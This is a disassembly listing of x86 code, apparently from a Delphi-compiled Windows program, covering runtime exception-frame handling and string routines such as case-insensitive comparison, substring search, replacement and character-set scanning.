		dd offset sub_402E04
		dd offset nullsub_1
		dd offset nullsub_2
		dd offset sub_402E18
		dd offset nullsub_3
		dd offset sub_402CD0
		dd offset sub_402CEC
		dd offset sub_402D08
dword_405508	dd 0Eh,	10000h		; DATA XREF: CODE:off_4054BCo
					; CODE:004054C8o
		db 2 dup(0)
		dd offset off_401018
		dw 4
		db 2 dup(0)
word_40551A	dw 4D0Ch		; DATA XREF: CODE:004054DCo
		dd 78456461h, 74706563h, 906E6F69h

; =============== S U B	R O U T	I N E =======================================


sub_405528	proc near		; CODE XREF: CODE:00406FF0p
		push	ebx
		push	esi
		push	edi
		test	dl, dl
		jz	short loc_405537
		add	esp, 0FFFFFFF0h
		call	sub_402E40

loc_405537:				; CODE XREF: sub_405528+5j
		mov	esi, ecx
		mov	ebx, edx
		mov	edi, eax
		lea	eax, [edi+4]
		mov	edx, esi
		call	sub_4039E8
		mov	eax, edi
		test	bl, bl
		jz	short loc_40555C
		call	sub_402E98
		pop	large dword ptr	fs:0
		add	esp, 0Ch

loc_40555C:				; CODE XREF: sub_405528+23j
		mov	eax, edi
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_405528	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_405564	proc near		; DATA XREF: CODE:00415B90o
		push	ebp
		mov	ebp, esp
		xor	eax, eax
		push	ebp
		push	offset loc_405589
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		inc	ds:dword_417678
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_405590

loc_405588:				; CODE XREF: sub_405564+2Aj
		retn
; ---------------------------------------------------------------------------

loc_405589:				; DATA XREF: sub_405564+6o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_405588
; ---------------------------------------------------------------------------

loc_405590:				; CODE XREF: sub_405564:loc_405588j
					; DATA XREF: sub_405564+1Fo
		pop	ebp
		retn
sub_405564	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_405594	proc near		; DATA XREF: CODE:00415B8Co
		sub	ds:dword_417678, 1
		retn
sub_405594	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40559C	proc near		; DATA XREF: CODE:00415BB0o
		push	ebp
		mov	ebp, esp
		xor	eax, eax
		push	ebp
		push	offset loc_4055C1
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		inc	ds:dword_41767C
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_4055C8

loc_4055C0:				; CODE XREF: sub_40559C+2Aj
		retn
; ---------------------------------------------------------------------------

loc_4055C1:				; DATA XREF: sub_40559C+6o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_4055C0
; ---------------------------------------------------------------------------

loc_4055C8:				; CODE XREF: sub_40559C:loc_4055C0j
					; DATA XREF: sub_40559C+1Fo
		pop	ebp
		retn
sub_40559C	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_4055CC	proc near		; DATA XREF: CODE:00415BACo
		sub	ds:dword_41767C, 1
		retn
sub_4055CC	endp


; =============== S U B	R O U T	I N E =======================================


sub_4055D4	proc near		; CODE XREF: sub_406CDC+26Cp
		push	ebx
		push	esi
		mov	esi, eax
		push	0FFFFFFFFh
		mov	edx, [esi]
		mov	eax, offset dword_405620
		mov	ecx, 1
		call	sub_405C6C
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_405615
		push	1
		mov	edx, [esi]
		mov	eax, offset dword_405620
		mov	ecx, 7FFFFFFFh
		call	sub_405C6C
		mov	ecx, eax
		sub	ecx, ebx
		inc	ecx
		mov	eax, esi
		mov	edx, ebx
		call	sub_4059A8
		pop	esi
		pop	ebx
		retn
; ---------------------------------------------------------------------------

loc_405615:				; CODE XREF: sub_4055D4+1Bj
		mov	eax, esi
		call	sub_403994
		pop	esi
		pop	ebx
		retn
sub_4055D4	endp

; ---------------------------------------------------------------------------
		align 10h
dword_405620	dd 0			; DATA XREF: sub_4055D4+8o
					; sub_4055D4+21o
		dd 0FFFFFFFEh, 6 dup(0FFFFFFFFh)

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_405640	proc near		; CODE XREF: sub_405908+3Bp

var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
var_20		= dword	ptr -20h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h
var_14		= dword	ptr -14h
var_10		= dword	ptr -10h
var_9		= byte ptr -9
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= byte ptr  8
arg_4		= byte ptr  0Ch

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFD0h
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_8], ecx
		mov	[ebp+var_4], edx
		mov	esi, eax
		mov	eax, [ebp+var_4]
		call	sub_403E14
		mov	eax, [ebp+var_8]
		call	sub_403E14
		xor	eax, eax
		push	ebp
		push	offset loc_4058F4
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	eax, [ebp+var_4]
		call	sub_403C24
		mov	[ebp+var_24], eax
		mov	eax, [ebp+var_8]
		call	sub_403C24
		mov	[ebp+var_28], eax
		mov	eax, [ebp+var_28]
		sub	eax, [ebp+var_24]
		mov	[ebp+var_2C], eax
		cmp	[ebp+var_2C], 0
		jg	loc_4057E4
		mov	eax, esi
		call	sub_403E74
		mov	eax, [esi]
		call	sub_403E24
		mov	[ebp+var_18], eax
		mov	eax, [esi]
		call	sub_403C24
		mov	edi, eax
		mov	eax, [ebp+var_4]
		call	sub_403E24
		mov	[ebp+var_1C], eax
		push	edi
		mov	al, [ebp+arg_0]
		push	eax
		push	0
		push	0FFFFFFFFh
		mov	ecx, [ebp+var_24]
		mov	edx, [ebp+var_18]
		mov	eax, [ebp+var_1C]
		call	sub_405A30
		mov	ebx, eax
		cmp	ebx, 0FFFFFFFFh
		setnz	[ebp+var_9]
		cmp	[ebp+var_9], 0
		jz	loc_4058D9
		mov	eax, [esi]
		call	sub_403E24
		mov	[ebp+var_10], eax
		mov	eax, [ebp+var_8]
		call	sub_403E24
		mov	[ebp+var_20], eax
		cmp	[ebp+arg_4], 0
		jz	short loc_405765

loc_405702:				; CODE XREF: sub_405640+10Fj
		sub	edi, ebx
		add	[ebp+var_10], ebx
		mov	edx, [ebp+var_10]
		mov	eax, [ebp+var_20]
		mov	ecx, [ebp+var_28]
		call	sub_402664
		cmp	[ebp+var_2C], 0
		jz	short loc_405733
		mov	ecx, edi
		sub	ecx, [ebp+var_24]
		mov	eax, [ebp+var_10]
		mov	edx, eax
		add	edx, [ebp+var_28]
		add	eax, [ebp+var_24]
		call	sub_402664
		add	edi, [ebp+var_2C]

loc_405733:				; CODE XREF: sub_405640+D9j
		push	edi
		mov	al, [ebp+arg_0]
		push	eax
		push	0
		push	0FFFFFFFFh
		mov	ecx, [ebp+var_24]
		mov	edx, [ebp+var_10]
		mov	eax, [ebp+var_1C]
		call	sub_405A30
		mov	ebx, eax
		cmp	ebx, 0FFFFFFFFh
		jnz	short loc_405702
		mov	edx, [ebp+var_10]
		sub	edx, [ebp+var_18]
		add	edx, edi
		mov	eax, esi
		call	sub_403F0C
		jmp	loc_4058D9
; ---------------------------------------------------------------------------

loc_405765:				; CODE XREF: sub_405640+C0j
		mov	eax, [ebp+var_10]
		mov	[ebp+var_14], eax

loc_40576B:				; CODE XREF: sub_405640+17Dj
		sub	edi, ebx
		sub	edi, [ebp+var_24]
		add	[ebp+var_10], ebx
		add	[ebp+var_14], ebx
		mov	edx, [ebp+var_10]
		mov	eax, [ebp+var_20]
		mov	ecx, [ebp+var_28]
		call	sub_402664
		mov	eax, [ebp+var_28]
		add	[ebp+var_10], eax
		mov	eax, [ebp+var_24]
		add	[ebp+var_14], eax
		push	edi
		mov	al, [ebp+arg_0]
		push	eax
		push	0
		push	0FFFFFFFFh
		mov	ecx, [ebp+var_24]
		mov	edx, [ebp+var_14]
		mov	eax, [ebp+var_1C]
		call	sub_405A30
		mov	ebx, eax
		test	ebx, ebx
		jle	short loc_4057BA
		mov	edx, [ebp+var_10]
		mov	eax, [ebp+var_14]
		mov	ecx, ebx
		call	sub_402664

loc_4057BA:				; CODE XREF: sub_405640+16Bj
		cmp	ebx, 0FFFFFFFFh
		jnz	short loc_40576B
		test	edi, edi
		jle	short loc_4057D0
		mov	edx, [ebp+var_10]
		mov	eax, [ebp+var_14]
		mov	ecx, edi
		call	sub_402664

loc_4057D0:				; CODE XREF: sub_405640+181j
		mov	edx, [ebp+var_10]
		sub	edx, [ebp+var_18]
		add	edx, edi
		mov	eax, esi
		call	sub_403F0C
		jmp	loc_4058D9
; ---------------------------------------------------------------------------

loc_4057E4:				; CODE XREF: sub_405640+52j
		mov	eax, [esi]
		call	sub_403C24
		push	eax
		mov	al, [ebp+arg_0]
		push	eax
		push	0
		push	0FFFFFFFFh
		mov	eax, [ebp+var_4]
		call	sub_403C24
		push	eax
		mov	eax, [esi]
		call	sub_403E24
		push	eax
		mov	eax, [ebp+var_4]
		call	sub_403E24
		pop	edx
		pop	ecx
		call	sub_405A30
		mov	ebx, eax
		inc	ebx
		test	ebx, ebx
		setnz	[ebp+var_9]
		cmp	[ebp+var_9], 0
		jz	loc_4058D9
		cmp	[ebp+arg_4], 0
		jz	short loc_405836
		mov	[ebp+var_30], 1
		jmp	short loc_40583C
; ---------------------------------------------------------------------------

loc_405836:				; CODE XREF: sub_405640+1EBj
		mov	eax, [ebp+var_28]
		mov	[ebp+var_30], eax

loc_40583C:				; CODE XREF: sub_405640+1F4j
		mov	eax, [esi]
		call	sub_403C24
		mov	edi, eax

loc_405845:				; CODE XREF: sub_405640+293j
		add	edi, [ebp+var_2C]
		mov	eax, esi
		mov	edx, edi
		call	sub_403F0C
		mov	eax, esi
		call	sub_403E7C
		mov	edx, [ebp+var_2C]
		add	edx, ebx
		lea	eax, [eax+edx-1]
		push	eax
		mov	eax, esi
		call	sub_403E7C
		lea	eax, [eax+ebx-1]
		mov	ecx, edi
		sub	ecx, ebx
		inc	ecx
		sub	ecx, [ebp+var_2C]
		pop	edx
		call	sub_402664
		mov	eax, esi
		call	sub_403E7C
		lea	eax, [eax+ebx-1]
		push	eax
		lea	eax, [ebp+var_8]
		call	sub_403E7C
		mov	ecx, [ebp+var_28]
		pop	edx
		call	sub_402664
		add	ebx, [ebp+var_30]
		mov	eax, [esi]
		call	sub_403C24
		push	eax
		mov	al, [ebp+arg_0]
		push	eax
		dec	ebx
		push	ebx
		push	7FFFFFFFh
		mov	eax, [ebp+var_4]
		call	sub_403C24
		push	eax
		mov	eax, [esi]
		call	sub_403E24
		push	eax
		mov	eax, [ebp+var_4]
		call	sub_403E24
		pop	edx
		pop	ecx
		call	sub_405A30
		inc	eax
		mov	ebx, eax
		test	ebx, ebx
		jnz	loc_405845

loc_4058D9:				; CODE XREF: sub_405640+A1j
					; sub_405640+120j ...
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_4058FB

loc_4058E6:				; CODE XREF: sub_405640+2B9j
		lea	eax, [ebp+var_8]
		mov	edx, 2
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_4058F4:				; DATA XREF: sub_405640+24o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_4058E6
; ---------------------------------------------------------------------------

loc_4058FB:				; CODE XREF: sub_405640+2B3j
					; DATA XREF: sub_405640+2A1o
		mov	al, [ebp+var_9]
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn	8
sub_405640	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_405908	proc near		; CODE XREF: sub_406CDC+3Ep

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= byte ptr  8

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF8h
		push	ebx
		mov	[ebp+var_8], ecx
		mov	[ebp+var_4], edx
		mov	ebx, eax
		mov	eax, [ebp+var_4]
		call	sub_403E14
		mov	eax, [ebp+var_8]
		call	sub_403E14
		xor	eax, eax
		push	ebp
		push	offset loc_405965
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	al, [ebp+arg_0]
		push	eax
		push	0
		mov	eax, ebx
		mov	ecx, [ebp+var_8]
		mov	edx, [ebp+var_4]
		call	sub_405640
		mov	ebx, eax
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40596C

loc_405957:				; CODE XREF: sub_405908+62j
		lea	eax, [ebp+var_8]
		mov	edx, 2
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_405965:				; DATA XREF: sub_405908+22o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_405957
; ---------------------------------------------------------------------------

loc_40596C:				; CODE XREF: sub_405908+5Cj
					; DATA XREF: sub_405908+4Ao
		mov	eax, ebx
		pop	ebx
		pop	ecx
		pop	ecx
		pop	ebp
		retn	4
sub_405908	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_405978	proc near		; CODE XREF: sub_405CF8+6Cp

var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_4], ecx
		mov	edi, edx
		mov	esi, eax
		mov	ebx, [ebp+arg_0]
		mov	eax, ebx
		mov	edx, esi
		call	sub_4039E8
		mov	eax, ebx
		mov	ecx, [ebp+var_4]
		mov	edx, edi
		call	sub_403EC4
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ebp
		retn	4
sub_405978	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_4059A8	proc near		; CODE XREF: sub_4055D4+39p
		push	ebx
		push	esi
		push	edi
		mov	edi, ecx
		mov	esi, edx
		mov	ebx, eax
		push	ebx
		mov	eax, [ebx]
		mov	ecx, edi
		mov	edx, esi
		call	sub_403E84
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_4059A8	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_4059C4	proc near		; CODE XREF: sub_40A478+93p
					; sub_40A57C+63p
		push	ebx
		push	esi
		push	edi
		push	ebp
		mov	esi, edx
		mov	edi, eax
		mov	eax, edi
		call	sub_403C24
		mov	ebx, eax
		mov	eax, esi
		call	sub_403C24
		cmp	ebx, eax
		setz	cl
		test	cl, cl
		jz	short loc_405A11
		mov	edx, ebx
		test	edx, edx
		jbe	short loc_405A11
		mov	eax, 1

loc_4059F0:				; CODE XREF: sub_4059C4+4Bj
		xor	ebx, ebx
		mov	bl, [edi+eax-1]
		mov	bl, ds:byte_4160BC[ebx]
		movzx	ebp, byte ptr [esi+eax-1]
		cmp	bl, ss:byte_4160BC[ebp]
		jz	short loc_405A0D
		xor	ecx, ecx
		jmp	short loc_405A11
; ---------------------------------------------------------------------------

loc_405A0D:				; CODE XREF: sub_4059C4+43j
		inc	eax
		dec	edx
		jnz	short loc_4059F0

loc_405A11:				; CODE XREF: sub_4059C4+1Fj
					; sub_4059C4+25j ...
		mov	eax, ecx
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_4059C4	endp


; =============== S U B	R O U T	I N E =======================================


sub_405A18	proc near		; CODE XREF: sub_405A30+48p
					; sub_405A30+57p
		mov	edx, edi
		mov	edi, eax
		mov	ecx, 0FFFFFFFFh
		xor	al, al
		repne scasb
		mov	eax, 0FFFFFFFEh
		sub	eax, ecx
		mov	edi, edx
		retn
sub_405A18	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_405A30	proc near		; CODE XREF: sub_405640+8Fp
					; sub_405640+105p ...

var_11		= byte ptr -11h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= byte ptr  10h
arg_C		= dword	ptr  14h

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFECh
		push	ebx
		push	esi
		push	edi
		mov	edi, ecx
		mov	esi, edx
		mov	ebx, eax
		mov	[ebp+var_4], 0FFFFFFFFh
		test	ebx, ebx
		jz	loc_405C5D
		test	edi, edi
		jnz	short loc_405A5B
		cmp	byte ptr [ebx],	0
		jz	loc_405C5D

loc_405A5B:				; CODE XREF: sub_405A30+20j
		test	esi, esi
		jz	loc_405C5D
		cmp	[ebp+arg_C], 0
		jnz	short loc_405A72
		cmp	byte ptr [esi],	0
		jz	loc_405C5D

loc_405A72:				; CODE XREF: sub_405A30+37j
		test	edi, edi
		jnz	short loc_405A7F
		mov	eax, ebx
		call	sub_405A18
		mov	edi, eax

loc_405A7F:				; CODE XREF: sub_405A30+44j
		cmp	[ebp+arg_C], 0
		jnz	short loc_405A8F
		mov	eax, esi
		call	sub_405A18
		mov	[ebp+arg_C], eax

loc_405A8F:				; CODE XREF: sub_405A30+53j
		cmp	edi, [ebp+arg_C]
		ja	loc_405C5D
		mov	eax, [ebp+arg_C]
		sub	eax, edi
		cmp	[ebp+arg_8], 0
		jz	short loc_405AB2
		xor	edx, edx
		mov	dl, [ebx]
		mov	dl, ds:byte_4160BC[edx]
		mov	[ebp+var_11], dl
		jmp	short loc_405AB7
; ---------------------------------------------------------------------------

loc_405AB2:				; CODE XREF: sub_405A30+71j
		mov	dl, [ebx]
		mov	[ebp+var_11], dl

loc_405AB7:				; CODE XREF: sub_405A30+80j
		mov	edx, [ebp+arg_4]
		cmp	edx, [ebp+arg_0]
		jbe	loc_405B9C
		cmp	eax, [ebp+arg_0]
		jb	loc_405C5D
		cmp	eax, [ebp+arg_4]
		jnb	short loc_405AD4
		mov	[ebp+arg_4], eax

loc_405AD4:				; CODE XREF: sub_405A30+9Fj
		mov	eax, [ebp+arg_4]
		add	eax, esi
		mov	edx, [ebp+arg_0]
		add	edx, esi
		mov	[ebp+var_8], edx
		lea	edx, [ebx+1]
		lea	ecx, [edi+ebx]
		dec	ecx
		mov	[ebp+var_10], edx
		cmp	[ebp+arg_8], 0
		jz	short loc_405B52
		cmp	eax, [ebp+var_8]
		jb	loc_405C5D

loc_405AFA:				; CODE XREF: sub_405A30+11Bj
		xor	ebx, ebx
		mov	bl, [eax]
		mov	bl, ds:byte_4160BC[ebx]
		cmp	bl, [ebp+var_11]
		jnz	short loc_405B47
		inc	eax
		mov	[ebp+var_C], eax
		jmp	short loc_405B11
; ---------------------------------------------------------------------------

loc_405B0F:				; CODE XREF: sub_405A30+F8j
		inc	eax
		inc	edx

loc_405B11:				; CODE XREF: sub_405A30+DDj
		cmp	ecx, edx
		jb	short loc_405B2A
		xor	ebx, ebx
		mov	bl, [eax]
		mov	bl, ds:byte_4160BC[ebx]
		movzx	edi, byte ptr [edx]
		cmp	bl, ds:byte_4160BC[edi]
		jz	short loc_405B0F

loc_405B2A:				; CODE XREF: sub_405A30+E3j
		cmp	ecx, edx
		jnb	short loc_405B3C
		mov	eax, [ebp+var_C]
		sub	eax, esi
		dec	eax
		mov	[ebp+var_4], eax
		jmp	loc_405C5D
; ---------------------------------------------------------------------------

loc_405B3C:				; CODE XREF: sub_405A30+FCj
		mov	edx, [ebp+var_10]
		mov	eax, [ebp+var_C]
		sub	eax, 2
		jmp	short loc_405B48
; ---------------------------------------------------------------------------

loc_405B47:				; CODE XREF: sub_405A30+D7j
		dec	eax

loc_405B48:				; CODE XREF: sub_405A30+115j
		cmp	eax, [ebp+var_8]
		jnb	short loc_405AFA
		jmp	loc_405C5D
; ---------------------------------------------------------------------------

loc_405B52:				; CODE XREF: sub_405A30+BFj
		cmp	eax, [ebp+var_8]
		jb	loc_405C5D

loc_405B5B:				; CODE XREF: sub_405A30+165j
		mov	bl, [eax]
		cmp	bl, [ebp+var_11]
		jnz	short loc_405B91
		inc	eax
		mov	[ebp+var_C], eax
		jmp	short loc_405B6A
; ---------------------------------------------------------------------------

loc_405B68:				; CODE XREF: sub_405A30+142j
		inc	eax
		inc	edx

loc_405B6A:				; CODE XREF: sub_405A30+136j
		cmp	ecx, edx
		jb	short loc_405B74
		mov	bl, [eax]
		cmp	bl, [edx]
		jz	short loc_405B68

loc_405B74:				; CODE XREF: sub_405A30+13Cj
		cmp	ecx, edx
		jnb	short loc_405B86
		mov	eax, [ebp+var_C]
		sub	eax, esi
		dec	eax
		mov	[ebp+var_4], eax
		jmp	loc_405C5D
; ---------------------------------------------------------------------------

loc_405B86:				; CODE XREF: sub_405A30+146j
		mov	edx, [ebp+var_10]
		mov	eax, [ebp+var_C]
		sub	eax, 2
		jmp	short loc_405B92
; ---------------------------------------------------------------------------

loc_405B91:				; CODE XREF: sub_405A30+130j
		dec	eax

loc_405B92:				; CODE XREF: sub_405A30+15Fj
		cmp	eax, [ebp+var_8]
		jnb	short loc_405B5B
		jmp	loc_405C5D
; ---------------------------------------------------------------------------

loc_405B9C:				; CODE XREF: sub_405A30+8Dj
		cmp	eax, [ebp+arg_4]
		jb	loc_405C5D
		cmp	eax, [ebp+arg_0]
		jnb	short loc_405BAD
		mov	[ebp+arg_0], eax

loc_405BAD:				; CODE XREF: sub_405A30+178j
		mov	eax, [ebp+arg_4]
		add	eax, esi
		mov	edx, [ebp+arg_0]
		add	edx, esi
		mov	[ebp+var_8], edx
		lea	edx, [ebx+1]
		lea	ecx, [edi+ebx]
		dec	ecx
		mov	[ebp+var_10], edx
		cmp	[ebp+arg_8], 0
		jz	short loc_405C22
		cmp	eax, [ebp+var_8]
		ja	loc_405C5D

loc_405BD3:				; CODE XREF: sub_405A30+1EEj
		xor	ebx, ebx
		mov	bl, [eax]
		mov	bl, ds:byte_4160BC[ebx]
		cmp	bl, [ebp+var_11]
		jnz	short loc_405C1A
		inc	eax
		mov	[ebp+var_C], eax
		jmp	short loc_405BEA
; ---------------------------------------------------------------------------

loc_405BE8:				; CODE XREF: sub_405A30+1D1j
		inc	eax
		inc	edx

loc_405BEA:				; CODE XREF: sub_405A30+1B6j
		cmp	ecx, edx
		jb	short loc_405C03
		xor	ebx, ebx
		mov	bl, [eax]
		mov	bl, ds:byte_4160BC[ebx]
		movzx	edi, byte ptr [edx]
		cmp	bl, ds:byte_4160BC[edi]
		jz	short loc_405BE8

loc_405C03:				; CODE XREF: sub_405A30+1BCj
		cmp	ecx, edx
		jnb	short loc_405C12
		mov	eax, [ebp+var_C]
		sub	eax, esi
		dec	eax
		mov	[ebp+var_4], eax
		jmp	short loc_405C5D
; ---------------------------------------------------------------------------

loc_405C12:				; CODE XREF: sub_405A30+1D5j
		mov	edx, [ebp+var_10]
		mov	eax, [ebp+var_C]
		jmp	short loc_405C1B
; ---------------------------------------------------------------------------

loc_405C1A:				; CODE XREF: sub_405A30+1B0j
		inc	eax

loc_405C1B:				; CODE XREF: sub_405A30+1E8j
		cmp	eax, [ebp+var_8]
		jbe	short loc_405BD3
		jmp	short loc_405C5D
; ---------------------------------------------------------------------------

loc_405C22:				; CODE XREF: sub_405A30+198j
		cmp	eax, [ebp+var_8]
		ja	short loc_405C5D

loc_405C27:				; CODE XREF: sub_405A30+22Bj
		mov	bl, [eax]
		cmp	bl, [ebp+var_11]
		jnz	short loc_405C57
		inc	eax
		mov	[ebp+var_C], eax
		jmp	short loc_405C36
; ---------------------------------------------------------------------------

loc_405C34:				; CODE XREF: sub_405A30+20Ej
		inc	eax
		inc	edx

loc_405C36:				; CODE XREF: sub_405A30+202j
		cmp	ecx, edx
		jb	short loc_405C40
		mov	bl, [eax]
		cmp	bl, [edx]
		jz	short loc_405C34

loc_405C40:				; CODE XREF: sub_405A30+208j
		cmp	ecx, edx
		jnb	short loc_405C4F
		mov	eax, [ebp+var_C]
		sub	eax, esi
		dec	eax
		mov	[ebp+var_4], eax
		jmp	short loc_405C5D
; ---------------------------------------------------------------------------

loc_405C4F:				; CODE XREF: sub_405A30+212j
		mov	edx, [ebp+var_10]
		mov	eax, [ebp+var_C]
		jmp	short loc_405C58
; ---------------------------------------------------------------------------

loc_405C57:				; CODE XREF: sub_405A30+1FCj
		inc	eax

loc_405C58:				; CODE XREF: sub_405A30+225j
		cmp	eax, [ebp+var_8]
		jbe	short loc_405C27

loc_405C5D:				; CODE XREF: sub_405A30+18j
					; sub_405A30+25j ...
		mov	eax, [ebp+var_4]
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		jmp	near ptr byte_4192C8+0A0Eh
sub_405A30	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_405C6C	proc near		; CODE XREF: sub_4055D4+12p
					; sub_4055D4+2Bp

var_4		= dword	ptr -4
arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		push	esi
		push	edi
		mov	ebx, ecx
		mov	esi, edx
		mov	[ebp+var_4], eax
		xor	edi, edi
		test	esi, esi
		jz	short loc_405CED
		mov	eax, esi
		call	sub_403C24
		cmp	ebx, [ebp+arg_0]
		jbe	short loc_405CBD
		cmp	eax, [ebp+arg_0]
		jb	short loc_405CED
		cmp	eax, ebx
		jnb	short loc_405C97
		mov	ebx, eax

loc_405C97:				; CODE XREF: sub_405C6C+27j
		mov	eax, ebx
		mov	edx, [ebp+arg_0]
		sub	edx, eax
		ja	short loc_405CED
		dec	edx

loc_405CA1:				; CODE XREF: sub_405C6C+4Dj
		mov	cl, [esi+eax-1]
		mov	ebx, [ebp+var_4]
		and	ecx, 0FFh
		bt	[ebx], ecx
		jnb	short loc_405CB7
		mov	edi, eax
		jmp	short loc_405CED
; ---------------------------------------------------------------------------

loc_405CB7:				; CODE XREF: sub_405C6C+45j
		dec	eax
		inc	edx
		jnz	short loc_405CA1
		jmp	short loc_405CED
; ---------------------------------------------------------------------------

loc_405CBD:				; CODE XREF: sub_405C6C+1Ej
		cmp	eax, ebx
		jb	short loc_405CED
		cmp	eax, [ebp+arg_0]
		jnb	short loc_405CC9
		mov	[ebp+arg_0], eax

loc_405CC9:				; CODE XREF: sub_405C6C+58j
		mov	eax, ebx
		mov	edx, [ebp+arg_0]
		sub	edx, eax
		jb	short loc_405CED
		inc	edx

loc_405CD3:				; CODE XREF: sub_405C6C+7Fj
		mov	cl, [esi+eax-1]
		mov	ebx, [ebp+var_4]
		and	ecx, 0FFh
		bt	[ebx], ecx
		jnb	short loc_405CE9
		mov	edi, eax
		jmp	short loc_405CED
; ---------------------------------------------------------------------------

loc_405CE9:				; CODE XREF: sub_405C6C+77j
		inc	eax
		dec	edx
		jnz	short loc_405CD3

loc_405CED:				; CODE XREF: sub_405C6C+12j
					; sub_405C6C+23j ...
		mov	eax, edi
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
		pop	ebp
		retn	4
sub_405C6C	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_405CF8	proc near		; CODE XREF: sub_405DCC+4Dp
					; sub_406144+39p ...

var_8		= dword	ptr -8
var_4		= dword	ptr -4
arg_0		= byte ptr  8

		push	ebp
		mov	ebp, esp
		push	0
		push	0
		push	ebx
		push	esi
		push	edi
		mov	ebx, ecx
		mov	edi, edx
		mov	esi, eax
		xor	eax, eax
		push	ebp
		push	offset loc_405DAD
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		test	edi, edi
		jle	short loc_405D92
		lea	eax, [ebp+var_4]
		mov	edx, edi
		call	sub_403F0C
		xor	ecx, ecx
		mov	cl, [ebp+arg_0]
		mov	eax, [ebp+var_4]
		mov	edx, edi
		call	sub_4027C0
		test	bl, bl
		jz	short loc_405D88
		mov	al, [ebp+arg_0]
		add	al, 0D0h
		sub	al, 0Ah
		jnb	short loc_405D7A
		cmp	dword ptr [esi], 0
		jz	short loc_405D7A
		mov	eax, [esi]
		cmp	byte ptr [eax],	2Dh
		jnz	short loc_405D7A
		push	offset dword_405DC8
		push	[ebp+var_4]
		lea	eax, [ebp+var_8]
		push	eax
		mov	eax, [esi]
		mov	ecx, 1
		mov	edx, 1
		call	sub_405978
		push	[ebp+var_8]
		mov	eax, esi
		mov	edx, 3
		call	sub_403CE4
		jmp	short loc_405D92
; ---------------------------------------------------------------------------

loc_405D7A:				; CODE XREF: sub_405CF8+46j
					; sub_405CF8+4Bj ...
		mov	ecx, [esi]
		mov	eax, esi
		mov	edx, [ebp+var_4]
		call	sub_403C70
		jmp	short loc_405D92
; ---------------------------------------------------------------------------

loc_405D88:				; CODE XREF: sub_405CF8+3Dj
		mov	eax, esi
		mov	edx, [ebp+var_4]
		call	sub_403C2C

loc_405D92:				; CODE XREF: sub_405CF8+20j
					; sub_405CF8+80j ...
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_405DB4

loc_405D9F:				; CODE XREF: sub_405CF8+BAj
		lea	eax, [ebp+var_8]
		mov	edx, 2
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_405DAD:				; DATA XREF: sub_405CF8+13o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_405D9F
; ---------------------------------------------------------------------------

loc_405DB4:				; CODE XREF: sub_405CF8+B4j
					; DATA XREF: sub_405CF8+A2o
		pop	edi
		pop	esi
		pop	ebx
		pop	ecx
